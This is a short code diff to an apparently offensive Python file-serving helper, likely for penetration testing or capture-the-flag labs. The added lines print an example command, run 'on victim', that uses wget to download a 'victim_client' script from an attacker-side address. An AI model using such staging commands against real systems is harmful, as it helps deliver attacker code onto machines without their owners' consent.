@@ -30,6 +30,9 @@ def main():
         for available_file in os.listdir():
             print(f'  {available_file}')
 
+        print('Example transfer commands (on victim):')
+        print(f'  $ wget 10.10.14.8:{PORT}/victim_client_10.10.14.8.py')
+
         print('Waiting for requests...')
         httpd.serve_forever()
 
